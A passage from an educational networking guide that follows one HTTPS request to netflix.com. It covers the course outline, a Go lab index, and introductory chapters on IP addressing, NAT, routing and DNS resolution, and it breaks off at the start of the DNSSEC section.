# The HTTPS Request Lifecycle — A Real-Life Guide (v1)

> What really happens when you type `https://www.netflix.com` and press Enter?
> This guide walks you through the major steps — from your keyboard to
> Netflix's servers and back to your screen — explained so a 5-year-old could
> follow the shape of it, with enough depth for a senior network engineer to
> use as a reference.

---

> **The series:** 1 OS → 2 Networking → 3 Security → 4 HTTPS walkthrough, with Go alongside.
>
> **You are here: step 4, The HTTPS walkthrough.** ← Previous: [Security Engineering in Depth](../security/real-life-security-guide-v1.md). This is the final step.
>
> [The full series map](#0-5-the-series-os-networking-security-https).

---

## What you will be able to do at the end

1. Explain, in order, the major systems involved between pressing Enter and a
   page appearing on screen — DNS, TCP/QUIC, TLS, HTTP, routing, proxies, load
   balancing, caching, and rendering.
2. Read a raw HTTP request or response and know what every header actually
   does, not just its name.
3. Explain the TLS 1.3 handshake, why forward secrecy matters, and how a
   certificate chain of trust actually establishes identity.
4. Trace a packet's exact path from your laptop to a server on the other
   side of the world — NAT, BGP, anycast, and VRRP included.
5. Explain why a CDN and a load balancer both exist, and what job each does
   that the other genuinely cannot.
6. Walk through the browser's rendering pipeline and diagnose why a real
   page feels janky or shifts around while loading.
7. Name the specific attack (XSS, CSRF, SSRF, clickjacking...) each security
   header and cookie flag in this lifecycle actually defends against.
8. Talk about SLI/SLO, 95th-percentile billing, and traffic engineering the
   way a network engineer operating a real datacenter actually does, and
   set SRE-style SLOs, error budgets, and burn-rate alerts for a service.
9. Build the server side in Go: a hardened HTTPS server, a reverse proxy, a
   caching edge, retries with idempotency, SSRF-safe clients, and streaming
   endpoints. Thirteen labs, each tested against real sites, ending with one
   request traced through every guide in the series (Chapter 25).

---

## How to use this guide

Each chapter follows the same shape, run through the same running example —
a single request to `https://www.netflix.com`:

```
   The Simple Version (5-year-old)   -> the whole idea, as an analogy
   Deep sections                     -> the real mechanism, with diagrams,
                                         protocol fields, and real config
   Key Takeaways                     -> the handful of facts worth keeping
```

Read top to bottom the first time — chapters build on each other roughly in
the order a request actually happens. After that, treat it as a reference:
jump straight to the chapter you need. Every chapter is self-contained
enough to read alone if you already know what came before it.

**Tools you need:** none, strictly. A terminal with `curl`, `dig`, and
`traceroute` (all pre-installed on macOS/Linux) lets you reproduce nearly
every example yourself, which is worth doing at least once per chapter.

---

## Contents

**Part 0 — Start here** *(read this first)*
- 0.1 Who this is for · 0.2 The learning flow · 0.3 The complete flow at a
  glance · 0.4 How not to get stuck · 0.5 **The series: OS → networking → security → HTTPS** ·
  0.6 **The Go labs: setup and index**

**Part 1 — Addresses, packets, and names**
1. How the Internet Works
2. DNS: Finding the Address

**Part 2 — Getting there reliably and privately**
3. TCP: Reliable Delivery
4. TLS & HTTPS: The Encrypted Tunnel

**Part 3 — The conversation and the map**
5. HTTP: The Conversation
6. OSI Layers: The Network Stack

**Part 4 — Global traffic routing**
7. NAT, VIP, BGP, Anycast & VRRP: Global Traffic Routing

**Part 5 — The infrastructure in between**
8. Proxies: The Middlemen
9. Load Balancers & Rate Limiting
10. CDN: Content Near You

**Part 6 — From bytes to pixels**
11. Browser Rendering: From Bytes to Pixels

**Part 7 — Keeping it safe and observable**
12. Security: Protecting the Entire Lifecycle
13. Traffic Direction: SLI & SLO

**Part 8 — Expert operations: running HTTPS in production**
14. HTTP version negotiation: HTTP/1.1, HTTP/2, HTTP/3, Alt-Svc, and fallbacks
15. Cache correctness: browser, CDN, proxy, and application caches
16. Certificate and domain operations: ACME, rotation, CT monitoring, and emergency revocation
17. Debugging the lifecycle: browser DevTools, curl, OpenSSL, packet capture, and logs
18. Capstone: diagnose a slow, broken, or unsafe HTTPS request end to end

**Part 9 — Build the lifecycle in Go**
19. A production HTTPS server in Go: TLS, timeouts, headers, and shutdown
20. Reverse proxies in Go: the client's identity, framing, and request smuggling
21. Resilience between services: rate limits, retries, idempotency, and circuit breakers
22. Outbound requests: SSRF and safe HTTP clients
23. SLIs, SLOs, and error budgets for HTTPS services
24. Streaming over HTTP: Server-Sent Events, WebSockets, and long-lived connections

**Part 10 — The whole series in one request**
25. One HTTPS request, every layer, every guide

**Appendices**
- A. Glossary (plain language)
- B. Further reading
- C. Answers to "Check yourself" (Chapters 14–25)

---

# Part 0 — Start here

## 0.1 Who this is for

| You are… | This guide fits? |
|---|---|
| New to networking, want the whole picture in one sitting | Yes — start at Chapter 1, read in order |
| A backend/frontend engineer who's never traced a request past `fetch()` | Yes — Parts 3, 5, and 6 are your highest-value reading |
| Preparing for a systems-design interview | Yes — the "Putting It All Together" sections in Chapters 7 and the flow diagram in 0.3 are exactly what gets asked |
| A network engineer who already knows TCP/BGP cold | Skim Parts 1–4, focus on Parts 5–7 (proxies, CDNs, rendering, security) |
| Looking for hands-on labs and exercises | See the companion `networking/tcp-ip/real-life-guide-v1.md` in this wiki — it's built around Practice sections and a home lab |

This guide is deliberately **conceptual and reference-style**: every chapter
explains a mechanism precisely and shows what it looks like on the wire, but
it doesn't carry a single running lab project across chapters the way some
other guides in this wiki do. If you want that, read this guide first for
the mental model, then do the hands-on guide.

## 0.2 The learning flow

Read chapters in order the first time — each one hands off directly to the
next, following one real request from your keyboard to Netflix's servers and
back. After the first pass, this is a reference: jump straight to whichever
chapter answers the question you actually have.

Every chapter ends with **Key Takeaways** — read those first if you're
deciding whether you already know a topic well enough to skip it.

## 0.3 The complete flow at a glance

Keep this diagram in mind as you read — every chapter in this guide zooms
into exactly one step of it.

```
You type: https://www.netflix.com [Enter]
│
├─① BROWSER checks its own caches
│   HSTS list → DNS cache → HTTP cache → Service Worker
│
├─② DNS RESOLUTION  (finds the IP address)                    -- Chapter 2
│   Browser → OS → Recursive Resolver
│           → Root NS → .com TLD NS → netflix.com NS
│           ← returns: 52.38.36.82 (IPv4) or 2600::/32 (IPv6)
│
├─③ S-NAT at your home router                                 -- Chapter 1
│   Your private IP 192.168.1.105 → public IP 203.0.113.45
│
├─④ INTERNET ROUTING  (packets travel across the world)       -- Chapter 7
│   Your router → ISP router → Internet Exchange Point
│   → Netflix border router (BGP) → Netflix Anycast VIP
│
├─⑤ TCP 3-WAY HANDSHAKE  (open a reliable connection)         -- Chapter 3
│   SYN → SYN-ACK → ACK  (1 round trip)
│
├─⑥ TLS 1.3 HANDSHAKE  (create the encrypted tunnel)          -- Chapter 4
│   ClientHello → ServerHello + Certificate + Finished
│   → ClientFinished  (1 round trip, keys never sent over wire)
│   SSL Termination happens at Netflix's edge
│
├─⑦ HTTP/2 REQUEST sent inside the encrypted tunnel           -- Chapter 5
│   GET / HTTP/2  + headers + cookies
│
├─⑧ D-NAT at Netflix edge                                     -- Chapter 7
│   VIP 52.38.36.82:443 → real backend 10.0.4.55:443
│
├─⑨ REVERSE PROXY (Nginx/Envoy)                                -- Chapter 8
│   Rate limit check → Auth check → Cache check → forward
│
├─⑩ L7 LOAD BALANCER                                           -- Chapter 9
│   Routes by URL path to correct microservice cluster
│
├─⑪ ORIGIN SERVER processes request
│   Nginx → Zuul API Gateway → Node.js SSR
│   Fetches: user data, recommendations, catalog
│   Renders HTML server-side
│
├─⑫ HTTP/2 RESPONSE sent back
│   200 OK + security headers + Brotli-compressed HTML          -- Chapter 12
│
├─⑬ RESPONSE TRAVELS BACK  (possibly served from a CDN edge)    -- Chapter 10
│   TLS encrypted → TCP segments → IP packets
│   → Internet → S-NAT reversed at your router
│   → Your browser
│
└─⑭ BROWSER RENDERS THE PAGE                                    -- Chapter 11
    HTML → DOM → + CSS → CSSOM → Render Tree
    → Layout → Paint → Composite → Screen
```

Chapter 13 (SLI/SLO) and the security material in Chapter 12 aren't single
steps in this diagram — they're cross-cutting concerns that apply to every
arrow in it.

## 0.4 How not to get stuck

- **If a chapter references something from an earlier one** ("covered in
  Chapter 3"), that's intentional — later chapters build on earlier
  mechanisms rather than re-explaining them. Go back if it's not fresh.
- **Reproduce examples yourself.** `dig www.netflix.com`, `curl -v
  https://example.com`, and your browser's Network tab (DevTools) turn every
  diagram in this guide into something you can watch happen in real time.
- **The "5-year-old" version is not a joke or filler** — if the deep section
  of a chapter loses you, go back to the analogy, then re-enter the deep
  section. It's there because the mechanism really is that simple at its
  core; the complexity is all in the edge cases.

---

## 0.5 The series: OS → networking → security → HTTPS

This guide is one of seven, designed to be read as **one course** in this order:

```
   1  OS & Linux  ──▶  2  Networking  ──▶  3  Security  ──▶  4  HTTPS walkthrough
                         2a OSI map          3a From Zero        (one request through
                         2b TCP/IP           3b In Depth          every guide, in Go)
   ════════════════════  Go, alongside every step  ════════════════════
```

| Step | Guide | What it gives you | Hands-on |
|---|---|---|---|
| 1 | [Operating Systems, Linux, and Containers](../os-linux/real-life-os-guide.md) | the machine every request starts and ends on: processes, memory, files, sockets, containers, Kubernetes | 9 Go labs ([Part 20](../os-linux/real-life-os-guide.md#part-20-systems-programming-in-go-the-os-from-inside-a-program)) |
| 2a | [The OSI Model, One Click at a Time](../networking/real-life-example-osi.md) | one click followed through all seven layers; the map for everything after it | concept map, 1 hour |
| 2b | [Networking from Zero (TCP/IP)](../networking/tcp-ip/real-life-guide-v1.md) | how machines talk: addressing, routing, TCP, TLS, packet capture, network operations | 23 Go labs ([§0.8](../networking/tcp-ip/real-life-guide-v1.md#0-8-the-go-labs-build-the-network-tools-yourself)) |
| 3a | [Security from Zero](../security/real-life-guide.md) | encoding vs hashing vs encryption, TLS, PKI, SSH, the OWASP Top 10, threat modelling | OpenSSL labs and a vulnerable app to break |
| 3b | [Security Engineering in Depth](../security/real-life-security-guide-v1.md) | cloud and Kubernetes security, distributed authorization, advanced web attacks, data protection, detection | 10 Go labs + a `govulncheck` exercise ([§0.8](../security/real-life-security-guide-v1.md#0-8-the-go-labs-security-mechanisms-you-can-run)) |
| 4 | **The HTTPS Request Lifecycle** ← you are here | one request end to end, then the server side built in Go; Chapter 25 traces one request through every guide | 13 Go labs ([§0.6](#0-6-the-go-labs-build-the-lifecycle-yourself), [Ch 25](#chapter-25-one-https-request-every-layer-every-guide)) |
| ∥ | [Go — The Complete Field Guide](../Golang/real-life-golang-guide.md) | the language behind every lab, plus the 120-day plan's multi-week projects | [120-day plan](../Golang/golang-90-day-plan.md) |

**Why this order.** Every network connection is a file descriptor owned by
a process, so the OS comes first. Networking comes next, because every attack and
defence in the security guides assumes you can follow a packet. Security comes
third, because it needs both. The HTTPS walkthrough comes last because a
single HTTPS request uses all of it, and [its final chapter](#chapter-25-one-https-request-every-layer-every-guide)
runs one request through every guide in a Go program. Go runs alongside the
whole way: each guide's "Build it in Go" labs turn its chapters into code you
can run.

**Reading paths by role:**

- **Backend engineer:** 1 (Phases 1–2, Part 20) → 2a → 2b (Parts 1–7) → 3a (Parts 1–6) →
  4 (all, including Part 9) → 3b (Parts 5–6).
- **SRE / platform:** 1 (all) → 2a → 2b (all) → 3b (Parts 2–4, 8) → 4 (Parts 8–10).
- **Security engineer:** 1 (Phases 1, 3) → 2a → 2b (Parts 3–8) → 3a → 3b → 4 (Chapters 12, 19–22, 25).
- **Engineering manager:** 2a → 1 (Chapters 1–3, 44, 66, 72) → 3b (Part 9) →
  4 (Chapters 13, 18, 23, 25).

Chapters link to each other directly, with **"Across the series"** notes where
another guide covers a topic in more depth.

## 0.6 The Go labs: build the lifecycle yourself

Chapters 14–25 each include a **"Build it in Go"** section: a complete program,
built only on Go's standard library, that turns the chapter into something you
can run against real sites and break on purpose. Every lab was run while
writing this guide, and the outputs shown are real.

**Setup:** install Go 1.22+ (`brew install go`, or go.dev/doc/install), then:

```bash
mkdir -p ~/httpslabs && cd ~/httpslabs && go mod init httpslabs
mkdir httptrace     # save the lab as httptrace/main.go
go run ./httptrace https://example.com/
```

If you haven't used Go's `net` package before, read
[TCP/IP guide §0.8](../networking/tcp-ip/real-life-guide-v1.md#0-8-the-go-labs-build-the-network-tools-yourself) first. It maps each Go call to the system
calls and packets underneath.

| Lab | Chapter | What you build |
|---|---|---|
| `protoprobe` | 14 | Which HTTP versions a site offers, via ALPN, Alt-Svc, and the DNS HTTPS record |
| `edgecache` | 15 | A mini CDN edge: Cache-Control, Vary, ETag/304, stale-while-revalidate |
| `certcheck` | 16 | A certificate inventory scanner with expiry thresholds, chain checks, and CT lookup |
| `httptrace` | 17 | `curl -w` in Go: per-phase timing, connection reuse, path headers |
| `httpsserver` | 19 | A production-shaped HTTPS server: TLS, timeouts, security headers, graceful shutdown |
| `slowloris` | 19 | A loopback-only demonstration of why server timeouts matter |
| `revproxy` | 20 | A path-routing reverse proxy: X-Forwarded-For done right, 502 vs 504 |
| `desync` | 20 | Request smuggling's root cause, reproduced safely |
| `resilience` | 21 | Rate limiting, idempotency keys, retries with budgets, a circuit breaker |
| `ssrfguard` | 22 | An HTTP client that is safe to point at user-supplied URLs |
| `slo` | 23 | SLIs, error budgets, and multi-window burn-rate alerts |
| `sse` | 24 | Server-Sent Events with heartbeats, resume, and the WriteTimeout trap |
| `walkthrough` | 25 | One HTTPS request through every layer, each step labelled with the guide that explains it |

# Part 1 — Addresses, packets, and names

Every later part of this guide assumes you have two facts straight: how a
device is identified on a network, and how a human-readable name becomes
that address. Start here even if you think you already know it — the NAT
and DNS mechanics from these two chapters get reused, unmodified, in Part
4's global routing and Part 7's security chapters.

## Chapter 1 — How the Internet Works

> Before anything else — DNS, TCP, TLS — you need to understand what the internet physically is and how data moves across it.

---

### The Simple Version (5-year-old)

Imagine you want to send a letter to a friend who lives far away.

- Your letter is too long to fit in one envelope, so you **cut it into 10 smaller pieces** (postcards).
- You write **your address** on the back and **your friend's address** on the front of each postcard.
- You hand them to your **local post office** (your router).
- Each post office along the way **reads the address** and **passes it to the next post office** closer to the destination.
- Your friend's post office delivers all 10 postcards to their house.
- Your friend **reassembles** the 10 postcards back into the full letter.

That is exactly what the internet does — but in milliseconds, not days.

---

### What is the Internet?

The internet is a **global network of networks**. Millions of devices — computers, phones, servers, routers — connected together by cables (copper, fiber optic) and wireless signals (Wi-Fi, 4G, 5G).

No single company owns the internet. It is a collection of **Autonomous Systems (AS)** — networks operated independently by ISPs (Comcast, AT&T), companies (Google, Netflix), universities, and governments — all agreeing to talk to each other using the same protocols.

```
Your Home Network (AS 65001)
    │
    └──► ISP Network (AS 7922 — Comcast)
              │
              └──► Internet Exchange Point (IXP)
                        │
                        ├──► Google (AS 15169)
                        ├──► Netflix (AS 2906)
                        └──► Amazon (AS 16509)
```

---

### IP Addresses — Your Home Address

Every device on the internet has an **IP address** — a unique number that identifies it, like a home address.

#### IPv4

The original addressing scheme. Looks like four numbers separated by dots:

```
203.0.113.45
```

Each number is 0–255. That gives us **4.3 billion total addresses** (2³²).

Problem: We have more than 4.3 billion devices in the world. We ran out of IPv4 addresses around 2011.

Solution 1: **NAT** (share one public IP among many devices) — covered below.
Solution 2: **IPv6** — a much bigger address space.

#### IPv6

A newer addressing scheme with vastly more addresses. Looks like eight groups of hex digits separated by colons:

```
2001:0db8:85a3:0000:0000:8a2e:0370:7334
```

How many addresses does IPv6 give us?
- IPv4: 2³² = ~4.3 billion
- IPv6: 2¹²⁸ = 340 **undecillion** (340 followed by 36 zeros)

That is enough to give every grain of sand on Earth its own IP address — and still have addresses left.

**IPv6 key differences from IPv4:**

| Feature | IPv4 | IPv6 |
|---|---|---|
| Address length | 32 bits | 128 bits |
| Address format | `203.0.113.45` | `2001:db8::1` |
| NAT required? | Yes (address shortage) | No (every device gets a real address) |
| Built-in security | Optional (IPsec) | Mandatory (IPsec) |
| Header size | Variable (20–60 bytes) | Fixed (40 bytes) |
| Broadcast | Yes | No (uses multicast) |
| Auto-configuration | DHCP | SLAAC (Stateless Address Autoconfiguration) |

#### Private vs Public IP Addresses

Not all IPv4 addresses are real internet addresses. Some ranges are **reserved for private networks** (your home, office, data center):

```
10.0.0.0    – 10.255.255.255    (10/8)     — large private networks
172.16.0.0  – 172.31.255.255   (172.16/12) — medium private networks
192.168.0.0 – 192.168.255.255  (192.168/16)— home/small office networks
```

Your laptop probably has `192.168.1.x`. Netflix's internal servers use `10.x.x.x`.

These private addresses are **not routable on the public internet** — routers will drop packets with private source IPs. This is where NAT comes in.

---

### Packets — Breaking Data into Pieces

Data does not travel as one continuous stream. It is broken into **packets** — small chunks, typically 1500 bytes or less.

**Why packets instead of one big stream?**

- If one part fails or gets corrupted, only that small packet is retransmitted — not the entire file.
- Multiple conversations can share the same physical link simultaneously (different packets interleave).
- Routers can make per-packet routing decisions — packets of the same stream can take different paths.

Each packet contains:
- **Header**: Source IP, destination IP, protocol, sequence number, length
- **Payload**: A chunk of your actual data

```
Your HTTP request (5000 bytes) gets split into:
  Packet 1: [Header | bytes   1–1460]
  Packet 2: [Header | bytes 1461–2920]
  Packet 3: [Header | bytes 2921–4380]
  Packet 4: [Header | bytes 4381–5000]

Each packet travels independently across the internet.
They may take different routes.
They are reassembled in order at the destination.
```

---

### Routers — The Post Offices

A **router** is a device whose job is to read the destination IP of each incoming packet and forward it toward that destination.

Every router maintains a **routing table** — a list of IP prefixes and which direction (interface) to forward packets destined for that prefix.

```
Router at ISP core:
  Routing table:
  ┌─────────────────────────┬──────────────────┐
  │ Destination Prefix      │ Next Hop         │
  ├─────────────────────────┼──────────────────┤
  │ 52.38.0.0/16           │ Netflix (AS2906) │
  │ 142.250.0.0/15         │ Google (AS15169) │
  │ 0.0.0.0/0              │ Upstream router  │
  └─────────────────────────┴──────────────────┘

Packet arrives: Dst=52.38.36.82
→ Matches 52.38.0.0/16
→ Forward toward Netflix
```

Routers operate at **Layer 3** (Network Layer) of the OSI model. They only look at IP addresses, not the content of packets.

**TTL (Time to Live):**
Every IPv4 packet has a TTL field (0–255). Each router that forwards the packet **decrements TTL by 1**. If TTL reaches 0, the router drops the packet and sends an ICMP "Time Exceeded" message back. This prevents packets from looping forever.

```
traceroute to netflix.com:
  1  192.168.1.1 (your router)      1ms   TTL=64→63
  2  10.0.0.1    (ISP gateway)      5ms   TTL=63→62
  3  72.14.232.1 (ISP core)        12ms   TTL=62→61
  4  ...
  n  52.38.36.82 (Netflix edge)    25ms   TTL=xx→xx
```

---

### NAT — Network Address Translation

**The simple version:** Your apartment building has ONE mailbox number on the street, but 50 apartments inside. The building manager has a list matching each apartment to a specific mailbox slot. When a letter comes in addressed to "123 Main St", the manager checks the list and delivers it to the right apartment.

NAT works the same way. Your home has ONE public IP address (assigned by your ISP), but many devices inside (laptop, phone, TV, etc.) all with private IPs.

#### Source NAT (S-NAT) — Outbound Traffic

When your laptop sends a packet out to the internet:

```
BEFORE (inside your home network):
  Source IP:   192.168.1.105  (your laptop's private IP)
  Source Port: 54321
  Dest IP:     52.38.36.82   (Netflix)
  Dest Port:   443

Your router performs S-NAT:
  Source IP:   203.0.113.45  (your public IP — assigned by ISP)
  Source Port: 54321
  Dest IP:     52.38.36.82
  Dest Port:   443

The router saves this translation in its NAT table:
  192.168.1.105:54321  ←→  203.0.113.45:54321
```

Netflix sees your request coming from `203.0.113.45` — it has no idea you're on `192.168.1.105` internally.

#### Destination NAT (D-NAT) — Inbound Traffic / Load Balancing

When Netflix's load balancer receives your packet:

```
BEFORE (arriving at Netflix's VIP):
  Source IP:   203.0.113.45  (you)
  Dest IP:     52.38.36.82   (Netflix VIP — the public address)
  Dest Port:   443

Netflix LB performs D-NAT:
  Source IP:   203.0.113.45
  Dest IP:     10.0.4.55     (a real backend server — private IP)
  Dest Port:   443
```

This is how **load balancers work at L4** — they use D-NAT to redirect connections from one public VIP to many private backend servers.

#### NAT Table — How Return Traffic Finds Its Way Back

```
S-NAT table in your home router:
  Private Endpoint        Public Endpoint         State
  192.168.1.105:54321 ←→ 203.0.113.45:54321     ESTABLISHED
  192.168.1.107:55000 ←→ 203.0.113.45:55000     ESTABLISHED

When Netflix's response arrives at 203.0.113.45:54321:
  Router looks up NAT table → finds mapping → delivers to 192.168.1.105:54321
```

#### Why IPv6 Eliminates NAT

Every device gets a globally routable IPv6 address. No need to share a single public IP. Your laptop can directly communicate with Netflix's servers — end-to-end, no translation.

This also means:
- Better performance (no translation overhead)
- Easier peer-to-peer applications
- No NAT traversal hacks needed
- Every device is directly reachable (security implications — need proper firewalls)

---

### How a Packet Travels Across the Internet (Step by Step)

Let us trace your Netflix request packet from your laptop to Netflix's server:

```
Step 1: Your laptop creates the packet
  Src: 192.168.1.105:54321  Dst: 52.38.36.82:443
  Data: [HTTP request]

Step 2: Packet arrives at your home router
  Router checks: Is 52.38.36.82 on my local network? NO
  Router performs S-NAT: 192.168.1.105 → 203.0.113.45
  Router looks up default route → forwards to ISP

Step 3: ISP's router receives packet
  Checks routing table for 52.38.0.0/16
  Finds path → Netflix (AS2906) via peering link
  Forwards packet

Step 4: Internet Exchange Point (IXP)
  Physical location where ISPs interconnect
  Packet crosses from your ISP's network to Netflix's network

Step 5: Netflix border router receives packet
  BGP routing: this packet is for 52.38.36.82
  Forwards to Netflix's internal network

Step 6: Netflix's load balancer (VIP 52.38.36.82)
  Performs D-NAT: 52.38.36.82 → 10.0.4.55 (real server)
  Forwards to backend

Step 7: Backend server receives packet
  Src: 203.0.113.45:54321  Dst: 10.0.4.55:443
  Processes request, sends response

Return journey (reverse of above, NAT translations reversed)
```

Each step takes microseconds to low milliseconds. The entire round trip (RTT) across a continent is typically 20–80ms.

---

### Across the series

- **Hands-on depth:** the [TCP/IP guide's Part 3](../networking/tcp-ip/real-life-guide-v1.md#part-3-ip-addresses-and-getting-around-the-world) covers
  addressing, subnet masks, NAT, routing, ICMP, and MTU with exercises.
  Its Go labs `subnet` (a subnet calculator and IPAM) and `whoami` (see your
  own NAT) are in [Chapters 10–12](../networking/tcp-ip/real-life-guide-v1.md#chapter-10-subnet-masks-the-part-everyone-finds-hard).
- **The layer view:** [OSI guide, Layer 3](../networking/real-life-example-osi.md#part-5-layer-3-network) follows one
  packet hop by hop and shows which header fields each router rewrites.

### Key Takeaways

- The internet is packets of data hopping through routers toward a destination IP address.
- IPv4 has a shortage of addresses (fixed by NAT). IPv6 solves this permanently.
- **S-NAT** lets many private devices share one public IP (your home router does this).
- **D-NAT** lets one public IP spread load across many backend servers (Netflix's load balancer does this).
- Routers make forwarding decisions per-packet based on the destination IP.
- TTL prevents packets from looping forever.
- RTT (Round-Trip Time) is the key latency metric — how long a packet takes to go and come back.

---

## Chapter 2 — DNS: Finding the Address

> Before your browser can connect to Netflix, it needs to know Netflix's IP address. DNS is how it finds out.

---

### The Simple Version (5-year-old)

Imagine you want to call your friend "Netflix" but you don't know their phone number. So you:

1. Ask your mom (your computer's resolver) — she doesn't know either.
2. Mom calls the **big phone book office** (the root name server) — they say "I don't know Netflix's number, but call the `.com` directory."
3. Mom calls the **`.com` directory** — they say "I don't know Netflix's exact number, but call Netflix's own office."
4. Mom calls **Netflix's own office** (their authoritative name server) — they give the real number: `52.38.36.82`.
5. Mom writes it down so she doesn't have to ask again for a while (caching).
6. Now you can call Netflix directly.

---

### What is DNS?

**DNS (Domain Name System)** is the internet's phone book. It translates human-readable names like `www.netflix.com` into machine-readable IP addresses like `52.38.36.82`.

Without DNS you would have to memorize `52.38.36.82` instead of `netflix.com`. DNS also lets Netflix change their IP address without you needing to update anything — the name stays the same.

---

### The Players in DNS

| Player | Role | Example |
|---|---|---|
| **Stub Resolver** | Built into your OS. Takes DNS queries from apps. | `systemd-resolved` on Linux, `mDNSResponder` on macOS |
| **Recursive Resolver** | Does the heavy lifting — queries the chain on your behalf. | `8.8.8.8` (Google), `1.1.1.1` (Cloudflare), your ISP's resolver |
| **Root Name Servers** | Top of the DNS hierarchy. 13 clusters worldwide. | `a.root-servers.net` through `m.root-servers.net` |
| **TLD Name Servers** | Responsible for top-level domains like `.com`, `.org`, `.io` | Verisign operates `.com` and `.net` |
| **Authoritative Name Server** | Netflix's own DNS server. Has the final answer. | `ns-1496.awsdns-59.org` |

---

### Full DNS Resolution — Step by Step

When you type `www.netflix.com` and no cache has the answer:

```
Your Browser
  │
  │  1. "What is the IP of www.netflix.com?"
  ▼
OS Stub Resolver
  │  checks /etc/hosts  →  not there
  │  checks OS DNS cache  →  MISS (or expired)
  │
  │  2. Sends query to configured recursive resolver
  ▼
Recursive Resolver (e.g., 8.8.8.8)
  │  checks its own cache  →  MISS
  │
  │  3. Queries a Root Name Server (.)
  │     "Who knows about .com?"
  ▼
Root Name Server (e.g., a.root-servers.net)
  │  "I don't know netflix.com, but for .com domains,
  │   ask these TLD servers: 192.5.6.30, 192.5.6.31..."
  │  (This is called a REFERRAL, not the final answer)
  │
  │  4. Queries the .com TLD Name Server
  │     "Who knows about netflix.com?"
  ▼
.com TLD Name Server (Verisign)
  │  "I don't know the IP, but netflix.com's own name servers are:
  │   ns-1496.awsdns-59.org, ns-1816.awsdns-35.co.uk..."
  │  (Another REFERRAL)
  │
  │  5. Queries netflix.com's Authoritative Name Server
  │     "What is the IP of www.netflix.com?"
  ▼
netflix.com Authoritative Name Server (AWS Route 53)
  │  "Here is the answer:"
  │   A    record: 52.38.36.82       TTL: 60s
  │   AAAA record: 2600:1f14:fff:f802::1   TTL: 60s
  │
  │  6. Recursive resolver caches this answer
  │     returns it to your OS stub resolver
  ▼
OS stub resolver caches it, returns to browser
  │
  ▼
Browser caches it, connects to 52.38.36.82
```

The whole process is typically 20–120ms for a cold lookup. With caching it's instant.

---

### DNS Record Types

DNS stores different types of records for different purposes:

| Record | Full Name | What It Stores | Example |
|---|---|---|---|
| `A` | Address | IPv4 address of a hostname | `www.netflix.com → 52.38.36.82` |
| `AAAA` | Quad-A | IPv6 address of a hostname | `www.netflix.com → 2600:1f14::1` |
| `CNAME` | Canonical Name | Alias — points one name to another | `www → netflix.com` |
| `NS` | Name Server | Which servers are authoritative for this domain | `netflix.com NS ns-1496.awsdns-59.org` |
| `MX` | Mail Exchange | Which server handles email for this domain | `netflix.com MX mail.netflix.com` |
| `TXT` | Text | Free-form text — used for SPF, DMARC, verification | `"v=spf1 include:amazonses.com ~all"` |
| `PTR` | Pointer | Reverse DNS — IP address to hostname | `82.36.38.52.in-addr.arpa → host.netflix.com` |
| `SOA` | Start of Authority | Metadata about the zone — serial number, TTL defaults | One per zone |
| `CAA` | Cert Authority Auth | Which CAs are allowed to issue TLS certs for this domain | `netflix.com CAA digicert.com` |
| `SRV` | Service | Service location (host + port) — used by some protocols | `_http._tcp.netflix.com SRV 10 0 80 www.netflix.com` |

#### CNAME Chains — How Aliases Work

```
www.netflix.com  CNAME  netflix.com.edgekey.net   (Akamai edge)
netflix.com.edgekey.net  CNAME  e1234.dscg.akamaiedge.net
e1234.dscg.akamaiedge.net  A  23.200.1.1
```

The resolver follows the chain until it hits an `A`/`AAAA` record. You cannot put a CNAME on the root domain (`netflix.com` itself) — that's called the **CNAME apex restriction**. Workarounds: `ALIAS` records or AWS Route 53 `ALIAS`.

---

### TTL — Time to Live

Every DNS record has a **TTL (Time to Live)** in seconds. This tells caches how long they can keep the answer before they must ask again.

```
netflix.com A record  TTL: 60 seconds
  → Your resolver can cache this for 60 seconds
  → After 60s, must ask again

google.com A record   TTL: 300 seconds
  → Cached for 5 minutes

cloudflare.com A record  TTL: 1800 seconds
  → Cached for 30 minutes
```

**Low TTL** = changes propagate fast (good for failovers) but more DNS queries (more load on resolvers).
**High TTL** = fewer queries (faster for users) but changes take longer to spread.

Large traffic-heavy services often use short TTLs for some records so they can
reroute users more quickly during an outage or traffic shift. The exact TTL
depends on the record, CDN strategy, and resolver behavior.

---

### DNS Caching — Layers

DNS answers are cached at multiple levels. Each layer serves from cache if the TTL hasn't expired:

```
[Browser DNS cache]          (checked first — fastest)
       │ MISS
       ▼
[OS DNS cache]               (/etc/hosts first, then OS resolver cache)
       │ MISS
       ▼
[Recursive Resolver cache]   (8.8.8.8, 1.1.1.1, or your ISP's)
       │ MISS
       ▼
[Full recursive resolution]  (Root → TLD → Authoritative)
```

You can inspect your browser's DNS cache at `chrome://net-internals/#dns`.

---

### IPv4 vs IPv6 — Happy Eyeballs

Modern browsers request **both** A (IPv4) and AAAA (IPv6) records simultaneously. Then they try both connections in parallel, preferring IPv6 (by giving it a 50ms head start). Whichever connects first wins. This algorithm is called **Happy Eyeballs (RFC 8305)**.

```
Browser sends simultaneously:
  DNS query for A record    (IPv4)
  DNS query for AAAA record (IPv6)

Both respond: IPv4=52.38.36.82, IPv6=2600:1f14::1

Browser starts:
  IPv6 connection attempt  (immediately)
  IPv4 connection attempt  (50ms later, as fallback)

IPv6 connects first → use IPv6
IPv6 fails         → IPv4 takes over seamlessly
```

Why prefer IPv6?
- No NAT — end-to-end, lower latency
- Better routing (no NAT state machines in the path)
- Future-proof

---

### Encrypted DNS — DoH and DoT

Standard DNS sends queries in **plain text over UDP port 53**. This means:
- Your ISP can see every domain you look up.
- Anyone on your network (coffee shop Wi-Fi) can snoop.
- DNS responses can be tampered with (cache poisoning).

Two solutions:

#### DNS over TLS (DoT) — Port 853
Wraps DNS in a TLS connection. Encrypted, but uses a different port — network admins can block or monitor port 853.

#### DNS over HTTPS (DoH) — Port 443
Sends DNS queries as HTTPS requests. Looks identical to regular web traffic — cannot be easily blocked without blocking all HTTPS.

```
Traditional DNS (plaintext):
  Browser  ──UDP:53──►  8.8.8.8
  Anyone can read: "query for www.netflix.com"

DoH (encrypted):
  Browser  ──HTTPS:443──►  1.1.1.1/dns-query
  Payload encrypted — ISP sees only: "you talked to 1.1.1.1"
```

Chrome, Firefox, and most modern browsers use DoH by default to resolvers like `1.1.1.1` (Cloudflare) or `8.8.8.8` (Google).

---

### DNSSEC — Preventing Fake Answers

**The problem:** A malicious resolver could lie. "netflix.com? That's at 1.2.3.4 (attacker's server)." Your traffic goes to the attacker. This is **DNS cache poisoning**.

**DNSSEC** (DNS Security Extensions) digitally signs DNS records. Each record has a cryptographic signature. Resolvers can verify the signature against a public key — forged answers are detected and rejected.

```
netflix.com A 52.38.36.82
